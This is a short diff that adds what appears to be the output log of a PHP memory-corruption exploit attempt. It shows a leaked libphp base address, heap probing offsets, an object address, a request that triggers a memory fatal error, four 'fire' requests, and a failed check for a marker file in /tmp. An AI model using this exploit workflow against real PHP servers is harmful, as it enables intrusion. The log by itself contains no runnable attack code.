@@ -1,0 +1,11 @@
+    libphp=0x7f1b442ec000
+    probe: R=0x7f1b42200000 offs=[139755050243690, 139755050243858, 139755050244026, 139755050244194]
+    V=0x7f1b4220166a (mod16=10)
+    OBJ=0x7f1b422017d8 (BOFF=366 ALIGN=6)
+    sacrifice: 200 b'<br />\n<b>Fatal error</b>:  Allowed memory size of 8388608 b'
+    readback @OBJ: 
+    [f] fire0 (9210000): 200
+    [f] fire1 (9210004): 200
+    [f] fire2 (9210008): 200
+    [f] fire3 (9210012): 200
+done; /tmp/x=cat: /tmp/x: No such file or directory
